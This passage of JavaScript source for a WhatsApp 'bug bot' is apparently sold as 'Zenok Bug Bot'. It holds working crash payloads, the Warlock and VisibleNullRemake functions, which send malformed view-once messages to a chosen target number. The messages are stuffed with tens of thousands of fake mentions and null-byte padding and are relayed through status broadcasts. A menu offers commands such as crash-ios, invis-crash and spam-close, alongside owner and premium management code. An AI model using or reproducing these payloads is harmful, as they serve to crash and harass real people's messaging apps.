                    description: "𐌓𐌉𐌆𐌗𐌅𐌄𐌋𐌆 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, messageX, {});
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "false" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
const mediaData = [
  {
    ID: "68917910",
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
  },
  {
    ID: "68884987",
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
  },
];

let sequentialIndex = 0;

async function Warlock(targetNumber) {
  const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: targetNumber,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(targetNumber, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetNumber],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: targetNumber },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function VisibleNullRemake(jid, mention) {
  const mentionedJid = [
    jid,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`)
  ];

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\u0000" + mentionedJid,
            format: "STACK"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: JSON.stringify({ status: true }) + "\u0000".repeat(10000),
            version: 3
          }
        },
        quotedMessage: {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  ephemeralSettingRequestMessage: { ephemeralDuration: 0 }
                }
              }
            }
          }
        }
      }
    }
  };

  // Kirim ke target utama
  await sock.relayMessage(jid, messagePayload, {
    stanzaId: `LubiX-Id${Math.floor(Math.random() * 99999)}`,
    participant: { jid }
  });

  // Kirim ke status broadcast
  await sock.relayMessage("status@broadcast", messagePayload, {
    messageId: null,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid },
          content: undefined
        }]
      }]
    }]
  }, { participant: jid });

  if (mention) {
    await sock.relayMessage(jid, {
      statusMentionMessage: {
        message: {
          protocolMessage: { key: null, type: 25 }
        }
      }
    }, { participant: { jid } });
  }
}
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: 'https://files.catbox.moe/5lrtuv.jpg',
      itemCount: "2025",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `𝘾𝙤𝙢𝙢𝙖𝙣𝙙 : ${command}\n 𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝙗𝙮 𝙆𝙞𝙣𝙜 𝙎𝙝𝙖𝙯𝙖𝙢`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363397001088335@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const Reply = (opueh) => {
news.sendMessage(from, {
 text: opueh,
  contextInfo: {
   forwardingScore: 99999,
    isForwarded: true,
     forwardedNewsletterMessageInfo: {
      newsletterJid: "120363397001088335@s.whatsapp.net",
       serverMessageId: null,
        newsletterName: `𝙕𝙀𝙉𝙊𝙆 𝘽𝙐𝙂`
        },
      externalAdReply: {
        showAdAttribution: true,
          title: `𝙕𝙀𝙉𝙊𝙆 𝘽𝙐𝙂`,
            body: `𝙑𝙚𝙧𝙨𝙞𝙤𝙣 1.0`,
             mediaType: 1,
              previewType: 'PHOTO',
               thumbnailUrl: 'https://files.catbox.moe/rkhrpl.jpg'
                }
                 }
                   }, { quoted: lol })
                    }
                    
//end
switch(command) {
case "menu": {
await news.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺︎︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔]=====
$ .𝙾𝚠𝚗𝚎𝚛𝚖𝚎𝚗𝚞
$ .𝙶𝚛𝚘𝚞𝚙𝚖𝚎𝚗𝚞
$ .𝙱𝚞𝚐𝚖𝚎𝚗𝚞
$ .𝙾𝚝𝚑𝚎𝚛𝚖𝚎𝚗𝚞
`
// 1. Send button image message
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/5lrtuv.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: '𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐌𝐄𝐍𝐔',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : King Shazam',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}

break
 case "bugmenu": {
     let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺︎︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯
     
=====[𝐁𝐔𝐆 𝐌𝐄𝐍𝐔]=====
$ .𝚌𝚛𝚊𝚜𝚑-𝚒𝚘𝚜
$ .𝚍𝚎𝚕𝚊𝚢
$ .𝚒𝚗𝚟𝚒𝚜-𝚌𝚛𝚊𝚜𝚑
$ .𝚜𝚙𝚊𝚖-𝚌𝚕𝚘𝚜𝚎
$ .𝚑𝚘𝚜𝚝-𝚍𝚎𝚕𝚊𝚢
`

// 1. Send button image message
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: '𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : King Shazam',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}

break
 case "groupmenu": {
     let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺︎︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔]=====
$ .𝚑𝚒𝚍𝚎𝚝𝚊𝚐
$ .𝚝𝚊𝚐𝚊𝚕𝚕
$ .𝚍𝚎𝚕
$ .𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔
$ .𝚔𝚒𝚌𝚔
$ .𝚊𝚍𝚍
`

news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: '𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : King Shazam',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Group menu",
                  title: "✨ Specials",
                  description: "Display Group menu",
                  id: '.groupmenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}
break

case 'ownermenu': {
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺︎︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔]=====
$ .𝚊𝚍𝚍𝚙𝚛𝚎𝚖 
$ .𝚍𝚎𝚕𝚙𝚛𝚎𝚖
$ .𝚊𝚍𝚍𝚘𝚠𝚗𝚎𝚛
$ .𝚍𝚎𝚕𝚘𝚠𝚗𝚎𝚛 
$ .𝚙𝚞𝚋𝚕𝚒𝚌
$ .𝚜𝚎𝚕𝚏
$ .𝚛𝚞𝚗𝚝𝚒𝚖𝚎
$ .𝚙𝚒𝚗𝚐
$ .𝚋𝚕𝚘𝚌𝚔
$ .𝚞𝚗𝚋𝚕𝚘𝚌𝚔
`
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: '𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : King Shazam',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}
break

case 'othermenu': {
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔]=====
$ .𝚙𝚕𝚊𝚢
$ .𝚞𝚛𝚕
$ .𝚟𝚟
$ .𝚜𝚝𝚒𝚌𝚔𝚎𝚛
$ .𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍
`
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: '𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : King Shazam',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}
break

case 'tqto': {
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺︎︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

     ━─≪ 𝐂𝐑𝐄𝐃𝐈𝐓𝐒 𝐓𝐎 ≫─━
➤ KING SHAZAM
➤ KING BADBOI
➤ TECH GIRL

`
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : 𝙺𝚒𝚗𝚐 𝚂𝚑𝚊𝚣𝚊𝚖",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: '𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : King Shazam',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}

break

case "addowner":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
gun = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let check = await news.onWhatsApp(gun)
if (check.length == 0) return Reply(`*\`Sorry number not registered on WhatsApp!!!\`*`)
ownerbot.push(gun)
fs.writeFileSync("./lib/owner.json", JSON.stringify(ownerbot))
Reply(`*\`Number ${gun} Added suksexfully to Owner!\`*`)
}
break

case "delowner":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
yes = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(yes)
ownerbot.splice(unp, 1)
fs.writeFileSync("./lib/owner.json", JSON.stringify(ownerbot))
Reply(`*\`Number ${yes} Deleted Suksexfully from Owner!\`*`)
}    
break

case "addprem":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
gun = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let check = await news.onWhatsApp(gun)
if (check.length == 0) return Reply(`*\`Sorry number not registered on WhatsApp!!!\`*`)
Premium.push(gun)
fs.writeFileSync("./lib/premium.json", JSON.stringify(Premium))
Reply(`*\`Number ${gun} Added suksexfully to Premium!\`*`)
}
 break
case "runtime" : {
let replyme = ` Hey👋 ${pushname} I am tutorial Bug bot I am Active since ${runtime(process.uptime())}`;
Reply(replyme)
}
  
break
 
case "delprem":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
yes = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = Premium.indexOf(yes)
Premium.splice(unp, 1)
fs.writeFileSync("./lib/premium.json", JSON.stringify(Premium))
Reply(`*\`Number ${yes} Deleted Suksexfully from Premium!\`*`)
}    
// clear bug case

break
case "dev":
case "devoloper":
case "owner": {
  let nameown = `𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺`
  let NoOwn = `2349076642926`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: nameown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝗞𝗶𝗻𝗴 𝗦𝗵𝗮𝘇𝗮𝗺\nX-WA-BIZ-NAME:[[ ༑ 𝗭𝗘𝗡𝗢𝗞 𝗕𝗨𝗚 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
